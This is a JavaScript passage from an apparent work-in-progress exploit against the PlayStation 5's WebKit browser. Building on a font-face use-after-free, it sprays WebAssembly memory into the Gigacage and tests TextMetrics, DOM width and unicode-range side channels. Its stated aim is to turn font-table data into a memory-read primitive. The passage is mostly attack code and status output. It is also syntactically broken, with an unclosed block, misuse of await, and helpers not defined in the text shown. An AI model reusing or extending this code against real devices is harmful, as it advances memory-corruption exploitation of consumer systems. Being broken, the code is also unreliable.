// ============================================================

// ============================================================
//  Helper: Measure ALL TextMetrics properties
// ============================================================
function measureAll(fontSpec, text) {
  try {
    ctx.font = fontSpec;
    const m = ctx.measureText(text);
    return {
      width: m.width,
      actualBoundingBoxAscent: m.actualBoundingBoxAscent,
      actualBoundingBoxDescent: m.actualBoundingBoxDescent,
      actualBoundingBoxLeft: m.actualBoundingBoxLeft,
      actualBoundingBoxRight: m.actualBoundingBoxRight,
      fontBoundingBoxAscent: m.fontBoundingBoxAscent,
      fontBoundingBoxDescent: m.fontBoundingBoxDescent
    };
  } catch(e) {
    return {error: e.message};
  }
}

// Helper: Create font with controlled hmtx (advance width)
function makeFontWithWidth(advanceWidth) {
  // Start with our base font
  const buf = new ArrayBuffer(FBb.length);
  const view = new DataView(buf);
  const src = new Uint8Array(buf);
  src.set(FBb);
  
  // Modify the hmtx table to change advance width
  // In our minimal font, the hmtx table is near the end
  // We'll modify specific bytes to encode our value
  // The exact offset depends on the font structure
  // For now, modify the last 8 bytes which should be in hmtx
  const offset = buf.byteLength - 8;
  view.setUint16(offset, advanceWidth & 0xFFFF, true);    // advanceWidth
  view.setUint16(offset + 2, 0, true);                     // lsb
  view.setUint16(offset + 4, advanceWidth & 0xFFFF, true); // second glyph
  view.setUint16(offset + 6, 0, true);                     // lsb
  
  return buf;
}

// Helper: Create font with controlled head table (unitsPerEm, bbox)
function makeFontWithHead(unitsPerEm, xMax, yMax) {
  const buf = new ArrayBuffer(FBb.length);
  const view = new DataView(buf);
  const src = new Uint8Array(buf);
  src.set(FBb);
  
  // Find head table and modify unitsPerEm and bbox
  // head table offset is typically at offset 12 + tableIndex * 16
  // We'll try modifying at several known offsets
  // unitsPerEm is at head+18 (2 bytes)
  // xMax is at head+36 (2 bytes), yMax at head+38 (2 bytes)
  
  // Search for the head table tag
  for (let i = 12; i < buf.byteLength - 54; i++) {
    if (src[i] === 0x68 && src[i+1] === 0x65 && 
        src[i+2] === 0x61 && src[i+3] === 0x64) {
      // Found 'head' tag at offset i
      // Table offset is at i+8 (4 bytes, big-endian)
      const tableOff = view.getUint32(i + 8, false);
      if (tableOff > 0 && tableOff + 54 < buf.byteLength) {
        // unitsPerEm at tableOff + 18
        view.setUint16(tableOff + 18, unitsPerEm & 0xFFFF, false);
        // xMax at tableOff + 36
        view.setUint16(tableOff + 36, xMax & 0xFFFF, false);
        // yMax at tableOff + 38
        view.setUint16(tableOff + 38, yMax & 0xFFFF, false);
        break;
      }
    }
  }
  
  return buf;
}

// ============================================================
//  Capture + Test
// ============================================================
document.fonts.load("1em trigger, x","AB").then(function(faces){
  for(var i=0;i<faces.length;i++){
    var f=faces[i];
    if(f.family&&f.family.indexOf("RC_")===0){rcFace=f;var m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
  }
  keep.push(faces);keep.push(rcFace);
  if(!rcFace){Fl("No RC");return}
  Ok("RC_"+rcIdx+" captured");
  hu("h3","RC:<b>"+rcIdx+"</b>");
  var ua=navigator.userAgent||"";var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
  hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

  xRuleIdx=sh.insertRule(
    "@font-face{font-family:x;src:local(Courier);font-weight:400;font-style:normal;unicode-range:U+0042}",
    sh.cssRules.length);
  fs();
  xRule=sh.cssRules[xRuleIdx];
  Ok("CSSRule for 'x' ready");

  // ============================================================
  //  PHASE 1: Baseline TextMetrics for "x" family
  // ============================================================
  pg(10);Sep();Hd("PHASE 1: Baseline TextMetrics");Sep();
  
  const baseline = measureAll("64px x", "BBBB");
  P("  Baseline metrics for '64px x' on 'BBBB':", "dm");
  for (const [key, val] of Object.entries(baseline)) {
    P("    " + key.padEnd(32) + " = " + val, typeof val === "number" && val !== 0 ? "hl" : "dm");
  }
  
  // Compare with known fonts
  P("");
  P("  Comparison with known fonts:", "dm");
  const knownFonts = ["Helvetica", "Courier", "Arial", "serif", "monospace"];
  for (const fam of knownFonts) {
    const m = measureAll("64px " + fam, "BBBB");
    P("    " + fam.padEnd(12) + " width=" + m.width + " asc=" + m.actualBoundingBoxAscent + " desc=" + m.actualBoundingBoxDescent,
      m.width !== baseline.width ? "hl" : "dm");
  }
  
  // ============================================================
  //  PHASE 2: Change RC face font data → re-measure
  //  THIS IS THE KEY TEST
  // ============================================================
  pg(25);Sep();Hd("PHASE 2: Font Data → Metrics Correlation");Sep();
  
  P("  Testing if changing RC face font data changes metrics...", "dm");
  P("");
  
  // Test with different advance widths
  const widthTests = [100, 200, 500, 1000, 2000, 5000, 10000];
  const widthResults = [];
  
  for (const w of widthTests) {
    try {
      // Create font with modified advance width
      const modBuf = makeFontWithWidth(w);
      
      // Delete old RC face and create new one with modified data
      document.fonts.delete(rcFace);
      const newRC = new FontFace("RC_" + rcIdx, modBuf, {
        unicodeRange: "U+0041",
        style: "italic",
        weight: "900",
        display: "block"
      });
      document.fonts.add(newRC);
      fs();
      
      // Measure
      const m = measureAll("64px x", "B");
      widthResults.push({writeWidth: w, measured: m});
      P("  advWidth=" + String(w).padStart(6) + " → textWidth=" + m.width.toFixed(2) + 
        " asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
        " desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
        m.width !== baseline.width ? "hl" : "dm");
      
      // Keep reference
      keep.push(newRC);
      rcFace = newRC;
      
    } catch(e) {
      P("  advWidth=" + w + " → ERR: " + e.message.substring(0,30), "er");
    }
  }
  
  // Check if any metrics changed
  const widthsChanged = widthResults.some(r => r.measured.width !== widthResults[0].measured.width);
  if (widthsChanged) {
    St("METRICS CHANGE WITH FONT DATA!");
    Hi("We have a font data → metrics side channel!");
  } else {
    Wr("Metrics did NOT change — browser may use fallback");
  }
  
  // ============================================================
  //  PHASE 3: Test with "x" directly (not through trigger)
  // ============================================================
  pg(40);Sep();Hd("PHASE 3: Direct 'x' Metrics");Sep();
  
  // Restore original RC
  try {
    document.fonts.delete(rcFace);
    const origRC = new FontFace("RC_" + rcIdx, mkBuf(), {
      unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
    });
    document.fonts.add(origRC);
    fs();
    rcFace = origRC;
    keep.push(origRC);
  } catch(e) {}
  
  // Measure "x" directly on canvas
  P("  Measuring '64px x' directly:", "dm");
  const xDirect = measureAll("64px x", "B");
  for (const [key, val] of Object.entries(xDirect)) {
    P("    " + key.padEnd(32) + " = " + val, typeof val === "number" && val !== 0 ? "hl" : "dm");
  }
  
  // ============================================================
  //  PHASE 4: Measure with different text content
  // ============================================================
  pg(50);Sep();Hd("PHASE 4: Text Content Variation");Sep();
  
  P("  Measuring different characters with '64px x':", "dm");
  P("");
  const testChars = [
    {ch: "B", code: 0x42},
    {ch: "A", code: 0x41},
    {ch: "C", code: 0x43},
    {ch: "W", code: 0x57},
    {ch: "M", code: 0x4D},
    {ch: "i", code: 0x69},
    {ch: "l", code: 0x6C},
    {ch: "0", code: 0x30},
    {ch: "\u00C0", code: 0xC0},
    {ch: "\u4E2D", code: 0x4E2D}
  ];
  
  for (const tc of testChars) {
    const m = measureAll("64px x", tc.ch);
    P("  U+" + tc.code.toString(16).toUpperCase().padStart(4, "0") + " '" + tc.ch + "' → width=" + 
      m.width.toFixed(2) + " asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
      " desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
      m.width > 0 ? "hl" : "dm");
  }
  
  // ============================================================
  //  PHASE 5: WASM Memory + Font Data Overlap
  //  Spray WASM memories in Gigacage, then check if
  //  font metrics reflect WASM-controlled data
  // ============================================================
  pg(60);Sep();Hd("PHASE 5: WASM Gigacage Spray");Sep();
  
  P("  Setting up WASM linear memory...", "dm");
  let wasmMemories = [];
  let wasmModule = null;
  
  try {
    // Minimal WASM module with memory
    const wasmCode = new Uint8Array([
      0x00,0x61,0x73,0x6D, 0x01,0x00,0x00,0x00,
      0x05,0x03,0x01,0x00,0x01,  // Memory: 1 page
      0x07,0x08,0x01, 0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00
    ]);
    
    wasmModule = new WebAssembly.Module(wasmCode);
    
    // Spray WASM memories
    for (let i = 0; i < 32; i++) {
      const inst = new WebAssembly.Instance(wasmModule);
      const mem = inst.exports.memory;
      const view = new DataView(mem.buffer);
      
      // Write marker pattern
      view.setUint32(0, 0xDEAD0000 | i, true);
      view.setUint32(4, 0xCAFEBABE, true);
      
      // Write fake font metric data at various offsets
      // Pretend this is a TrueType hmtx table
      view.setUint16(0x100, 5000 + i, true); // advanceWidth
      view.setUint16(0x102, 0, true);        // lsb
      view.setUint16(0x104, 3000 + i, true); // advanceWidth for glyph 1
      view.setUint16(0x106, 0, true);        // lsb
      
      // Write TrueType magic + head-like data
      view.setUint32(0x200, 0x00010000, false); // sfVersion
      view.setUint16(0x212, 1000 + i, false);   // unitsPerEm
      view.setUint16(0x224, 500 + i, false);    // xMax
      view.setUint16(0x226, 700 + i, false);    // yMax
      
      wasmMemories.push({mem, view, index: i});
    }
    
    Ok("32 WASM memories allocated in Gigacage");
    P("  Total WASM memory: " + (wasmMemories.length * 64) + "KB", "dm");
    
    // Now re-measure "x" to see if metrics reflect WASM data
    P("");
    P("  Re-measuring '64px x' after WASM spray:", "dm");
    const afterWasm = measureAll("64px x", "B");
    P("  width=" + afterWasm.width.toFixed(2) + 
      " asc=" + (afterWasm.actualBoundingBoxAscent||0).toFixed(2) +
      " desc=" + (afterWasm.actualBoundingBoxDescent||0).toFixed(2),
      afterWasm.width !== xDirect.width ? "hl" : "dm");
    
    if (Math.abs(afterWasm.width - xDirect.width) > 0.01) {
      St("METRICS CHANGED AFTER WASM SPRAY!");
      Hi("Font data may overlap with WASM Gigacage memory!");
    }
    
  } catch(e) {
    Fl("WASM: " + e.message);
  }
  
  // ============================================================
  //  PHASE 6: Controlled Font Data → Metrics
  //  Create fonts with very specific data and measure
  // ============================================================
  pg(70);Sep();Hd("PHASE 6: Controlled Font Data Test");Sep();
  
  P("  Creating fonts with controlled metric values...", "dm");
  P("");
  
  // Test with different unitsPerEm values
  const upemTests = [100, 500, 1000, 2000, 4000, 8000, 16384];
  const upemResults = [];
  
  for (const upem of upemTests) {
    try {
      const modBuf = makeFontWithHead(upem, 1000, 1000);
      
      // Delete and recreate RC face
      document.fonts.delete(rcFace);
      const newRC = new FontFace("RC_" + rcIdx, modBuf, {
        unicodeRange: "U+0041", style: "italic", weight: "900", display: "block"
      });
      document.fonts.add(newRC);
      fs();
      keep.push(newRC);
      rcFace = newRC;
      
      // Wait for load then measure
      const m = measureAll("64px x", "B");
      upemResults.push({upem: upem, width: m.width, asc: m.actualBoundingBoxAscent, desc: m.actualBoundingBoxDescent});
      
      P("  upem=" + String(upem).padStart(6) + " → width=" + m.width.toFixed(2) + 
        " asc=" + (m.actualBoundingBoxAscent||0).toFixed(2) +
        " desc=" + (m.actualBoundingBoxDescent||0).toFixed(2),
        "dm");
    } catch(e) {
      P("  upem=" + upem + " → ERR: " + e.message.substring(0,30), "er");
    }
  }
  
  // Check if any results differ
  const upemChanged = upemResults.some(r => r.width !== upemResults[0].width);
  if (upemChanged) {
    St("METRICS VARY WITH unitsPerEm!");

  // ============================================================
  //  PHASE 7: Measure via DOM elements (offsetWidth)
  // ============================================================
  pg(80);Sep();Hd("PHASE 7: DOM offsetWidth Oracle");Sep();
  
  P("  Testing DOM element width as oracle...", "dm");
  P("");
  
  // Create hidden divs with different fonts
  const domTests = [
    {font: "64px x", text: "B"},
    {font: "64px trigger", text: "A"},
    {font: "64px Helvetica", text: "B"},
    {font: "64px Courier", text: "B"},
    {font: "900 italic 64px x", text: "B"},
    {font: "100 normal 64px x", text: "B"}
  ];
  
  for (const t of domTests) {
    try {
      const d = document.createElement("div");
      d.textContent = t.text;
      d.style.cssText = "position:absolute;left:-9999px;font:" + t.font + ";";
      document.body.appendChild(d);
      const w = d.offsetWidth;
      const h = d.offsetHeight;
      P("  " + t.font.padEnd(28) + " '" + t.text + "' → w=" + w + " h=" + h, w > 0 ? "hl" : "dm");
      document.body.removeChild(d);
    } catch(e) {
      P("  " + t.font + " → ERR", "er");
    }
  }
  
  // ============================================================
  //  PHASE 8: CSSRule unicode-range Oracle
  //  Set unicode-range to individual codepoints and test
  // ============================================================
  pg(90);Sep();Hd("PHASE 8: unicode-range Oracle");Sep();
  
  P("  Testing unicode-range as bit oracle...", "dm");
  P("");
  
  // Test individual codepoints
  const rangeTests = [
    {range: "U+0041", char: "A", name: "U+0041"},
    {range: "U+0042", char: "B", name: "U+0042"},
    {range: "U+0043", char: "C", name: "U+0043"},
    {range: "U+0041-0044", char: "A", name: "U+0041-0044"},
    {range: "U+0061", char: "a", name: "U+0061"},
    {range: "U+0030", char: "0", name: "U+0030"},
    {range: "U+E000", char: "\uE000", name: "U+E000"},
    {range: "U+FFFF", char: "\uFFFF", name: "U+FFFF"},
    {range: "U+0000", char: "\u0000", name: "U+0000"},
    {range: "U+10FFFF", char: String.fromCodePoint(0x10FFFF), name: "U+10FFFF"}
  ];
  
  for (const t of rangeTests) {
    try {
      xRule.style.unicodeRange = t.range;
      xRule.style.fontWeight = "400";
      fs();
      
      // Check if load returns a face for this character
      const faces = await document.fonts.load("64px x", t.char);
      const hasFace = faces.length > 0 && faces.some(f => f.family === "x");
      
      // Also check via measureText
      ctx.font = "64px x";
      const w = ctx.measureText(t.char).width;
      
      P("  " + t.name.padEnd(14) + " char='" + t.char + "' → load=" + faces.length + 
        " width=" + w.toFixed(2) + (hasFace ? " ← FACE" : ""),
        hasFace ? "hl" : "dm");
    } catch(e) {
      P("  " + t.name + " → ERR: " + e.message.substring(0,30), "er");
    }
  }
  
  // Restore
  try { xRule.style.unicodeRange = "U+0042"; fs(); } catch(e) {}
  
  // ============================================================
  //  SUMMARY
  // ============================================================
  pg(100);Sep();Hd("FINAL SUMMARY");Sep();
  P("");
  P("  UAF:                  ✅");
  P("  RC captured:          RC_" + rcIdx);
  P("  CSSRule for 'x':      ✅");
  P("  TextMetrics measured: ✅");
  P("  Font data variation:  " + (widthsChanged ? "✅ METRICS CHANGED!" : "❌ no change"));
  P("  WASM spray:           " + (wasmMemories.length > 0 ? wasmMemories.length + " memories" : "failed"));
  P("  upem variation:       " + (upemChanged ? "✅ CHANGED!" : "❌ no change"));
  P("");
  
  if (widthsChanged || upemChanged) {
    St("FONT DATA → METRICS SIDE CHANNEL CONFIRMED!");
    P("  We can read controlled font data through TextMetrics!", "hl");
    P("  Next: encode addresses in font tables", "hl");
    P("  Read back via measureText() = memory read!", "hl");
    hu("h4", "METRICS:<b>READ!</b>");
  } else {
    P("  Metrics did NOT change with font data.", "wr");
    P("  Browser likely uses fallback for metrics too.", "dm");
    P("  Need binary RE to find alternative read path.", "dm");
    hu("h4", "METRICS:<b>FALLBACK</b>");
  }

}).catch(function(e){Fl("Load: " + e.message)});

// async helper
function await(promise) {
  return promise;
}
</script>
